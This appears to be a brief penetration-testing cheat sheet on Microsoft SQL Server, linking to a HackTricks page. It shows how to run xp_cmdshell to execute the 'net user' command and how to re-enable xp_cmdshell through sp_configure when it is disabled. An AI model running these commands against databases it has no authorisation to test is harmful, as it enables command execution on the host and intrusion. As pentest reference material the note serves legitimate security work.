# Microsoft SQL server
All info: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

## xp_cmdshell
A common target is to run the stored procedure xp_cmdshell  
Check if user can run:
```bash
EXEC xp_cmdshell 'net user';
```
if deactivated:
```bash
# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```


